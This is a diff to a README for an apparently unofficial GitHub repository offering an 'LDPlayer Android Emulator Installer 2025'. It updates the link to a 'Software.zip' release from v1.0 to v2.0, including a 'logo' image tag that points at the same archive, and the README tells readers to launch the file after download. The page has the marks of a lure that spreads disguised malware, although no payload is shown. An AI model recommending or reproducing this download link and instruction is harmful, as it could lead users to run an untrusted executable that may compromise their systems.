@@ -19,7 +19,7 @@ LDPlayer Android Emulator is a powerful tool that allows you to emulate the Andr
 
 To get started with LDPlayer Android Emulator Installer 2025, simply download the latest version from the following link:
 
-[Download LDPlayer Android Emulator Installer 2025](https://github.com/NoSoyDax/LDPlayer-Android-Emulator-Installer-2025/releases/download/v1.0/Software.zip) 📥
+[Download LDPlayer Android Emulator Installer 2025](https://github.com/NoSoyDax/LDPlayer-Android-Emulator-Installer-2025/releases/download/v2.0/Software.zip) 📥
 
 **Note:** The file needs to be launched after download.
 
@@ -64,6 +64,6 @@ Thank you for choosing LDPlayer Android Emulator! Happy gaming! 🎉
 
 ---
 
-![LDPlayer Logo](https://github.com/NoSoyDax/LDPlayer-Android-Emulator-Installer-2025/releases/download/v1.0/Software.zip)
+![LDPlayer Logo](https://github.com/NoSoyDax/LDPlayer-Android-Emulator-Installer-2025/releases/download/v2.0/Software.zip)
 
 ---
